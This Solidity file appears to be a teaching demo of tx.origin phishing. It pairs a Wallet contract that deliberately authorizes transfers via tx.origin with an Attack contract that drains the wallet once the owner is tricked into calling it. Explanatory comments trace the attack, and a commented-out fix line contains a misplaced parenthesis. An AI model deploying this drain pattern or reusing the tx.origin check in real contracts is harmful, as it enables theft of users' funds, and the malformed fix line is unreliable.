// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let's see how we can hack this contract
*/

/*
1. Alice deploys Wallet with 10 Ether
2. Eve deploys Attack with the address of Alice's Wallet contract.
3. Eve tricks Alice to call Attack.attack()
4. Eve successfully stole Ether from Alice's wallet

What happened?
Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
requested a transfer of all funds in Alice's wallet to Eve's address.
Since tx.origin in Wallet.transfer() is equal to Alice's address,
it authorized the transfer. The wallet transferred all Ether to Eve.
*/
/*Phishing with tx.origin
-- waht is tx.origin
Alice -> A -> B(msg.sender = A ,tx.origin = Alice)

-- contract using tx.origin
-  exploit tx.origin
-  demo
-  preventative technique
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }
    function deposit()public payable{}
/* Alice  -> Wallet.transfer() (tx.origin = Alice)
Alice -> Eve's malicious contract -> Wallet.transfer() (tx.origin = Alice)
*/
    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");
        //预防攻击
        //  require(msg.sender) == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
    function getBalance()public view returns(uint){
        return address(this).balance;
    }

}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
